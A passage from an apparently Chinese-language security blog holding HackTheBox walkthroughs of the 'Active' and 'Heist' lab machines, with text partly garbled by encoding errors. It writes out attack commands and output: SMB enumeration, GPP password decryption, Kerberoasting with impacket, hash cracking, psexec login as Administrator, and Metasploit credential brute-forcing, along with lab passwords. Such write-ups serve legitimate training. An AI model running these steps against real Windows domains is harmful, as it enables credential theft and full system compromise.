<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">./nmapAutomator.sh 10.10.10.100 Full</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>é™¤äº†53å’Œ445å¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«èƒ½äº¤äº’çš„ç«¯å£</p>
<figure class="highlight less"><table><tbody><tr><td class="code"><pre><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="number">7.80</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2020-02-10 18:56 +08</span></span><br><span class="line">Nmap scan report for <span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line">Host is up (<span class="number">0.23s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp    open  domain        Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39) (Windows Server <span class="number">2008</span> R2 SP1)</span><br><span class="line">| <span class="attribute">dns-nsid</span>: </span><br><span class="line">|_  bind.<span class="attribute">version</span>: Microsoft DNS <span class="number">6.1</span>.<span class="number">7601</span> (<span class="number">1</span>DB15D39)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="attribute">time</span>: <span class="number">2020</span>-<span class="number">02</span>-<span class="number">10</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">27</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (<span class="attribute">Domain</span>: active.htb, <span class="attribute">Site</span>: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">5722</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Microsoft-HTTPAPI/<span class="number">2.0</span></span><br><span class="line">|<span class="attribute">_http-title</span>: <span class="keyword">Not</span> Found</span><br><span class="line"><span class="number">49152</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49153</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49154</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49155</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49157</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49158</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49169</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49171</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49182</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">Host</span>: DC; <span class="attribute">OS</span>: Windows; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:<span class="attribute">windows_server_2008</span>:<span class="attribute">r2</span>:sp1, <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">microsoft</span>:windows</span><br><span class="line"></span><br><span class="line">Host script <span class="attribute">results</span>:</span><br><span class="line">|<span class="attribute">_clock-skew</span>: <span class="number">38s</span></span><br><span class="line">| <span class="attribute">smb2-security-mode</span>: </span><br><span class="line">|   <span class="number">2.02</span>: </span><br><span class="line">|_    Message signing enabled <span class="keyword">and</span> required</span><br><span class="line">| <span class="attribute">smb2-time</span>: </span><br><span class="line">|   <span class="attribute">date</span>: <span class="number">2020</span><span class="attribute">-02-10T10</span>:<span class="number">58</span>:<span class="number">25</span></span><br><span class="line">|_  <span class="attribute">start_date</span>: <span class="number">2020</span><span class="attribute">-02-10T08</span>:<span class="number">17</span>:<span class="number">06</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">194.25</span> seconds</span><br><span class="line"></span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546</span></span><br></pre></td></tr></tbody></table></figure>

<h1 id="ä¸€ï¼ŒSMB-ENUMERATION"><a href="#ä¸€ï¼ŒSMB-ENUMERATION" class="headerlink" title="ä¸€ï¼ŒSMB ENUMERATION"></a>ä¸€ï¼ŒSMB ENUMERATION</h1><p>é¦–å…ˆ ä½¿ç”¨smbmap æ¥ç¡®å®šanonymousç”¨æˆ·çš„æƒé™ï¼ˆå¦‚æœæœ‰å†™æƒé™å¯ä»¥ç›´æ¥ç”¨impacket æ¥è·å–shellï¼‰</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>å‘ç°å¯¹ <strong>Replication</strong> æ–‡ä»¶å¤¹ <strong>READ ONLY</strong>æƒé™<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210211447140.png" class="lazyload"><br>ï¼ˆè¿™é‡Œæˆ‘æœ¬æ¥æƒ³ä½¿ç”¨mountæŒ‚è½½smb, ä½†å¤±è´¥äº†ã€‚æœ‰æˆåŠŸçš„å¯ä»¥åœ¨è¯„è®ºå‘Šè¯‰æˆ‘ã€‚ï¼‰</p>
<p>ä½¿ç”¨ smbclientè¿›è¡Œè¿æ¥ <strong>Replication</strong></p>
<figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">smbclient <span class="symbol">\\</span><span class="symbol">\\</span>10.10.10.100<span class="symbol">\\</span>Replication</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p>å‘ç°ä¸¤ä¸ªæœ‰æ„æ€çš„æ–‡ä»¶å¤¹</p>
<figure class="highlight apache"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">31B2F340</span>-<span class="number">016</span>D-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04FB984F9 æ˜¯Default admin policy</span><br><span class="line"><span class="attribute">6AC1786C</span>-<span class="number">016</span>F-<span class="number">11</span>D2-<span class="number">945</span>F-<span class="number">00</span>C04fB984F9 æ˜¯Default domain polices</span><br><span class="line"><span class="attribute">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/2020021021181611.png" class="lazyload"><br>å¦‚æœæ²¡è®°é”™çš„è¯ windows server 2012ä»¥ä¸‹çš„ç‰ˆæœ¬ ä¼šæŠŠå¯†ç å‚¨å­˜åœ¨GPOã€‚<br>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾<br><strong>smb: \active.htb\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups</strong></p>
<p>åœ¨æ­¤ç›®å½•å‘ç°Groups.xml</p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210212552448.png" class="lazyload"><br>å‘ç°å¸å·å’Œå¯†ç å“ˆå¸Œå€¼</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">å¸å·ï¼šactive.htb\SVC_TGS</span><br><span class="line">å“ˆå¸Œå€¼ï¼šedBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p>å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„gpp-decryptæ¥ç ´è§£å¯†ç </p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">gpp-decrypt edBSHOwhZLTjt<span class="regexp">/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/</span>NglVmQ</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p>å¾—åˆ°å¯†ç  <strong>GPPstillStandingStrong2k18</strong><br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210212726788.png" class="lazyload"><br>ç°åœ¨æˆ‘ä»¬æœ‰äº†æ–°çš„å¸å· åˆ©ç”¨Smbmapç¡®è®¤æˆ‘ä»¬æ˜¯å¦æœ‰å†™çš„æƒé™ï¼ˆæ‹¿shellï¼‰</p>
<figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.100</span> -u SVC_TGS -p GPPstillStandingStrong2k18</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210213100537.png" class="lazyload"><br>å‘ç°èƒ½è¯»æƒé™èƒ½è¯»åˆ°userç›®å½•é‡Œçš„æ–‡ä»¶<br>å¯ä»¥ç”¨smbclient è¿›å»æ‹¿user.txt</p>
<h1 id="ä¸‰ï¼ŒROOT"><a href="#ä¸‰ï¼ŒROOT" class="headerlink" title="ä¸‰ï¼ŒROOT"></a>ä¸‰ï¼ŒROOT</h1><p>ä¹‹å‰çœ‹åˆ° ç«¯å£88 æœ‰ kerberos åœ¨è¿è¡Œã€‚å°è¯•åˆ©ç”¨kerberoasing æ”»å‡»</p>
<p><a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/094369852800.htm">Kerberoasing æ”»å‡»</a></p>
<p>åˆ©ç”¨ impacket-GetUserSPNs</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/impacket-GetUserSPNs -request active.htb/</span>SVC_TGS:GPPstillStandingStrong2k18 -dc-ip <span class="number">10.10</span>.<span class="number">10.100</span> </span><br><span class="line"></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210221812462.png" class="lazyload"><br>å¾—åˆ°hashå åˆ©ç”¨john the ripperè¿›è¡Œç ´è§£<br>å¾—åˆ° Administratorå¯†ç ä¸º Ticketmaster1968<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/202002102219053.png" class="lazyload"></p>
<p>å–åˆ°å¸å·å’Œå¯†ç å æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ impacket psexec è¿›è¡Œç™»å½•</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/doc/</span>python3-impacket<span class="regexp">/examples/</span>psexec.py active.htb/Administrator:Ticketmaster1968@<span class="number">10.10</span>.<span class="number">10.100</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200210222712526.png" class="lazyload"></p>
<p>æˆåŠŸ æ‹¿åˆ°Administrator</p>
<br>
<br>
<br>

<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>

		  	  
	</div>



	<div class="article-categories">
	 
      <i class="iconfont icon-category" style="margin-right:4px"></i>
	  	            
				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
		
      
	</div>
	

	<div class="article-tags">
		
			<i class="iconfont icon-tags" style="margin-right:4px"></i>
			            
				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
			            
				<a class="link" href="/tags/smb/">smb</a>           
			
		
	</div>

	<div class="article-bottom">
		<a class="readmore" href="/2020/02/10/HTB-Active/">Continue</a> 	
	</div>	
    
</article>

	
	
	
	

<article class="article">		
	   
	<div class="article-header">
	    
		<a class="title" href="/2020/01/26/HTB-Heist/">HTB Heist Writeup</a>  
	       
		 

		<div class="meta">
			<time>Jan 26, 2020</time>			
		</div>
	</div>


	

    
	<div class="typo article-excerpt">	
		 
			<h1 id="No-4-Heist-éš¾åº¦ç®€å•-HTB-walkthrough"><a href="#No-4-Heist-éš¾åº¦ç®€å•-HTB-walkthrough" class="headerlink" title="No.4-Heist-éš¾åº¦ç®€å•-HTB-walkthrough"></a>No.4-Heist-éš¾åº¦ç®€å•-HTB-walkthrough</h1><p>æ”»å‡»æœºï¼šå®˜æ–¹Kali linux 2019 64ä½<br>ä½œè€…ï¼š<strong>Ikonw</strong></p>
<h1 id="é¶æœºä»‹ç»"><a href="#é¶æœºä»‹ç»" class="headerlink" title="é¶æœºä»‹ç»"></a>é¶æœºä»‹ç»</h1><p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126112412354.png" class="lazyload"></p>
<h1 id="ä¸€ï¼Œç«¯å£æ‰«æ"><a href="#ä¸€ï¼Œç«¯å£æ‰«æ" class="headerlink" title="ä¸€ï¼Œç«¯å£æ‰«æ"></a>ä¸€ï¼Œç«¯å£æ‰«æ</h1><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sC heist.htb</span><br><span class="line">1</span><br><span class="line">Nmap scan report <span class="keyword">for</span> heist.htb (10.10.10.149)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php                                                                                                                                                                                                         </span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                          </span><br><span class="line">445/tcp open  microsoft-ds?                                                                                                                                                                                                                </span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">Host script results:                                                                                                                                                                                                                       </span><br><span class="line">|_clock-skew: 4s                                                                                                                                                                                                                           </span><br><span class="line">| smb2-security-mode:                                                                                                                                                                                                                      </span><br><span class="line">|   2.02:                                                                                                                                                                                                                                  </span><br><span class="line">|_    Message signing enabled but not required                                                                                                                                                                                             </span><br><span class="line">| smb2-time:                                                                                                                                                                                                                               </span><br><span class="line">|   <span class="built_in">date</span>: 2020-01-25T01:23:05                                                                                                                                                                                                              </span><br><span class="line">|_  start_date: N/A                                                                                                                                                                                                                        </span><br><span class="line">1234567891011121314151617181920212223242526</span><br></pre></td></tr></tbody></table></figure>

<h1 id="äºŒï¼ŒHTTP-Enumeration"><a href="#äºŒï¼ŒHTTP-Enumeration" class="headerlink" title="äºŒï¼ŒHTTP Enumeration"></a>äºŒï¼ŒHTTP Enumeration</h1><p>è¿›å…¥web, æ˜¯ä¸ªç™»é™†é¡µé¢ã€‚ å¹¶æ²¡æœ‰æ‰¾åˆ°CMS, å³ä¸‹è§’æœ‰ä¸ª <strong>Login as guest</strong><br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126114331293.png" class="lazyload"><br>å‘ç°è¿™æ˜¯ä¸ª ç±»ä¼¼äº <strong>Support desk</strong> çš„å¹³å°ã€‚<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126113042235.png" class="lazyload"><br>ç‚¹å‡» Attachment è·³è½¬åˆ° config.txt</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Ã‚ mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization <span class="built_in">exec</span> SSH</span><br><span class="line"> transport input ssh</span><br><span class="line">1234567891011121314151617181920212223242526272829303132333435363738394041</span><br></pre></td></tr></tbody></table></figure>

<p>å…¶ä¸­æœ‰ä¸‰è¡Œæ˜¯åŒ…å«å“ˆå¸Œå€¼çš„</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">enable</span> secret 5 $1$pdQG<span class="variable">$o8nrSzsGXeaduXrjlvKc91</span>  // Type 5 </span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713 //Type 7 </span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 //type 7 </span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>

<p>æŒ‰ç…§ä¹‹å‰æ‰€è¯´çš„ï¼Œè¿™åº”è¯¥åˆ†åˆ«CISCOçš„å“ˆå¸Œå€¼ã€‚<br>åˆ†åˆ«ä¸º type 5 è·Ÿ type 7ã€‚type 5æ˜¯æœ‰saltè¿‡çš„ã€‚<br>åˆ©ç”¨ç½‘ä¸Šçš„å·¥å…·æ¥è¿›è¡Œç ´è§£ã€‚</p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126114855103.png" class="lazyload"><br>Type 5 çš„æ¯”è¾ƒéº»çƒ¦ï¼Œç½‘ä¸Šçš„å·¥å…·æ²¡èƒ½æ‰¾åˆ°å¯†ç ã€‚<br>æ‰¾åˆ°ä¸€ä¸ª <a target="_blank" rel="noopener" href="https://github.com/axcheron/cisco_pwdecrypt">githubè„šæœ¬</a>ã€‚<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126115301683.png" class="lazyload"><br>ç°åœ¨æˆ‘ä»¬å·²ç»æ‰¾åˆ°å…¨éƒ¨çš„è´¦å·å’Œå¯†ç </p>
<table>
<thead>
<tr>
<th>è´¦å·</th>
<th>å¯†ç </th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>$uperP@ssword</td>
</tr>
<tr>
<td>rout3r</td>
<td>Q4)sJu\Y8qz*A3?d</td>
</tr>
<tr>
<td>Hazard</td>
<td>stealth1agent</td>
</tr>
</tbody></table>
<h1 id="ä¸‰ï¼Œæ‹¿åˆ°shell"><a href="#ä¸‰ï¼Œæ‹¿åˆ°shell" class="headerlink" title="ä¸‰ï¼Œæ‹¿åˆ°shell"></a>ä¸‰ï¼Œæ‹¿åˆ°shell</h1><p>å°è¯•ä½¿ç”¨ç°æœ‰çš„è´¦å·å’Œå¯†ç  æ¥ç™»é™†ç½‘é¡µï¼Œä½†æç¤ºéœ€è¦ç”¨é‚®ç®±ã€‚åˆ©ç”¨äº†ä¾‹å­å¦‚ <strong><a href="mailto:admin@heist.htb">admin@heist.htb</a></strong><br>ä¹Ÿæ²¡æœ‰è¿›å±•ã€‚</p>
<p>åˆ©ç”¨metasploit çš„smblogin æ¥è¿›è¡Œçˆ†ç ´ã€‚<br><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/202001261158540.png" class="lazyload"><br>å‘ç°åªæœ‰ <strong>Hazrd:stealth1agent</strong> å¯ä»¥ç™»é™†<br>å‘ç°æƒé™éƒ½æ˜¯No Accesså’ŒREADã€‚</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing<span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445        Name: 10.10.10.149                                      </span><br><span class="line">        Disk                                                    Permissions</span><br><span class="line">        ----                                                    -----------</span><br><span class="line">        ADMIN$                                                  NO ACCESS</span><br><span class="line">        C$                                                      NO ACCESS</span><br><span class="line">        IPC$                                                    READ ONLY</span><br><span class="line">123456789</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>IPC$(Internet Process Connection)æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤ï¼Œè¿æ¥åŒæ–¹å¯ä»¥å»ºç«‹å®‰å…¨çš„é€šé“å¹¶ä»¥æ­¤é€šé“è¿›è¡ŒåŠ å¯†æ•°æ®çš„äº¤æ¢ï¼Œä»è€Œå®ç°å¯¹è¿œç¨‹è®¡ç®—æœºçš„è®¿é—®ã€‚</p>
</blockquote>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <strong>READ ONLY</strong> çš„IPC$æ¥å–å¾—æœ¬åœ°è´¦å·çš„ä¿¡æ¯ã€‚</p>
<p>åˆ©ç”¨rpclientæ¥è¿æ¥</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">"Hazard%stealth1agent"</span> heist.htb</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126121648687.png" class="lazyload"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥åŒæ ·åˆ©ç”¨SIDæ¥è·å–ç”¨æˆ·å<br>sidçš„åå››ä½æ˜¯ç”¨æˆ·çš„ç¼–å·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é€æ¸å¢åŠ æ¥æ‰¾åˆ°æœ¬æœºçš„ç”¨æˆ·åå­—</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126121846444.png" class="lazyload"><br>å‘ç°å¤šä¸‰ä¸ªç”¨æˆ·ä¸º Chase,support,Jasonã€‚</p>
<p>å¦å¤–ä¸€ä¸ªæ–¹æ³•æ˜¯ç”¨ <strong>impacket</strong> (å¥½ä¸œè¥¿å‘€ï¼‰ã€‚</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@xing:/opt<span class="comment"># locate lookupsid.py</span></span><br><span class="line">/usr/share/doc/python3-impacket/examples/lookupsid.py</span><br><span class="line"></span><br><span class="line">root@xing:/opt<span class="comment"># python /usr/share/doc/python3-impacket/examples/lookupsid.py Hazard:stealth1agent@10.10.10.149</span></span><br><span class="line">Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.10.149</span><br><span class="line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br><span class="line">123456789101112131415161718</span><br></pre></td></tr></tbody></table></figure>

<p>å°è¯•äº†å„ç§ç»„åˆè¿˜æ˜¯æ— æ³•ç™»é™†smbæˆ–è€…webã€‚<br>äºæ˜¯å†³å®šå†æ‰«ä¸€énmap çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆé«˜ç«¯å£æ˜¯æ¼æ‰çš„ã€‚<br>å‘ç°äº†5985ç«¯å£å¼€ç€</p>
<blockquote>
<p>WinRM æ˜¯windows ä¸€ç§æ–¹ä¾¿è¿œç¨‹ç®¡ç†çš„æœåŠ¡ï¼›å¼€å¯winrm service,ä¾¿äºåœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œè¿œç¨‹ç®¡ç†æœåŠ¡å™¨ï¼Œæˆ–é€šè¿‡è„šæœ¬ï¼ŒåŒæ—¶ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œæ¥æé«˜å·¥ä½œæ•ˆç‡</p>
</blockquote>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126145922341.png" class="lazyload"><br>è¿™è¾¹å¯ä»¥åˆ©ç”¨ä¸€ç§å·¥å…·å«evil-winrm æ¥è¿›è¡Œç™»é™†ã€‚</p>
<p>æœ‰å…´è¶£çš„å¯ä»¥äº†è§£æ›´å¤š<br><a target="_blank" rel="noopener" href="https://www.uedbox.com/post/58739/">Evil-winRM è¿œç¨‹ç®¡ç†shell</a></p>
<p>é¦–å…ˆï¼Œåˆ©ç”¨metasploit çš„ <strong>scanner/winrm/winrm_login</strong> æ¨¡å—æ¥çˆ†ç ´å¸å·å’Œå¯†ç ã€‚<br>ï¼ˆè¿™ä¹ˆå¤šå¸å·å’Œå¯†ç  åˆ°åº•å“ªä¸ªå¯†ç æ˜¯å“ªä¸ªå‘€ï¼‰ã€‚</p>
<p>æŠŠæ–°å–å¾—çš„è´¦å· å…¨éƒ¨ä¿å­˜è¿› possible_userã€‚<br>ç„¶åæ ¹æ®lookupsidå–å¾—çš„ DOMAINå¡«å†™ã€‚</p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126150720402.png" class="lazyload"></p>
<p><img src="/images/placeholder.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" data-src="/images/old-machine-images/20200126150815832.png" class="lazyload"></p>
<p>æˆåŠŸå–å¾—æœ‰æ•ˆç™»é™†</p>
<p><strong>Chase:Q4)sJu\Y8qz*A3?d</strong></p>
<p>åˆ©ç”¨evil-winrm è¿›è¡Œç™»é™†</p>
